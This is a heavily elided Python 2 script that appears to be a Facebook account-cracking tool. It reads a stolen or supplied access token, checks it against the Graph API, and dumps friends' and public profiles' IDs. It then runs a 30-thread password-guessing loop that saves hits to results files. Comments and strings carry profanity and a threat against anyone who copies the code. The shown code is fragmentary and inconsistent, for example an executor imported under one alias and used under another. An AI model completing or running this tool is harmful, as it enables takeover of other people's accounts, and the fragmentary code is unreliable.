#!/usr/bin/python2
# coding=utf-8
# code by MALIK MUJAHID
# my facebook ( https://www.facebook.com/TERI.MA.KA.REAL.THOKU )

#      (C) Copyright 407 Authentic Exploit
#      Rebuild Copyright Can't make u real programmer:)
#      Coded By MALIK MUJAHID.
...
from concurrent.futures import ThreadPoolExecutor as MalikMujahid
...
logo = ''' \033[0;96m __  __        __  ______  ____
 \033[0;96m MUJAHID KING ® \033[0m|| Created By MALIK MUJAHID
 \033[0;96m MUJAHID D4DA     \033[0m|| Github.com/Malikmujahid1
 \033[0;96m KING OF KINGS \033[0;91mv2.0  \033[0m|| Facebook.com/TERI.MA.KA.REAL.THOKU'''
...
def moch_MUJAHID():
    ...
    try:
        ...
        print '\n %s[%s×%s] token invalid'%(N,M,N);time.sleep(2);os.system('rm -rf .ppk/.memek.txt'); MUJAHID()
    try:
        nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(kontol)).json()['name']
    except KeyError:
        print '\n %s[%s×%s] token invalid'%(N,M,N);time.sleep(2);os.system('rm -rf .ppk/.memek.txt'); MUJAHID()
    ...
    pepek = raw_input('\n [*] menu : ')
    if pepek == '':
        print '\n %s[%s×%s] jangan kosong kentod!'%(N,M,N);time.sleep(2);moch_MUJAHID()
    elif pepek in['1','01']:
        teman(kontol)
    elif pepek in['2','02']:
        publik(kontol)
...
# The one who replaces the bot, I swear, your mother will die!
def wuhan(kontol):
    try:
        kentod = kontol
...
def teman(kontol):
    ...
    try:
        ...
        print 50 * '-'
        raw_input(' [%s ENTER%s ] '%(O,N));moch_MUJAHID()
    except (KeyError,IOError):
        os.remove(cin)
        jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
        raw_input(' [ %sKEMBALI%s ] '%(O,N));moch_MUJAHID()
'''
																																																				csy = 'Cindy sayang Yayan'
																																																				ysc = 'Yayan sayang Cindy'
																																																			'''

# dump id from  public hehe
def publik(kontol):
    try:
        os.mkdir('dump')
    except:pass
...
class __crack__:
        ...
        if ___yayanganteng___ in ('Y', 'y'):
            ...
            while True:
                ...
                if pwek == '':
                    ...
                    def __yan__(ysc=None): # ycs => MUJAHID D4D4:3
                        cin = raw_input('\n [*] method : ')
                        if cin == '':
    ...
    def __pler__(self):
        ...
        if yan == '':
            ...
            print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta);time.sleep(0.2)
            jalan('\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N));time.sleep(0.2)
            with YayanGanteng(max_workers=30) as (__MUJAHID__):
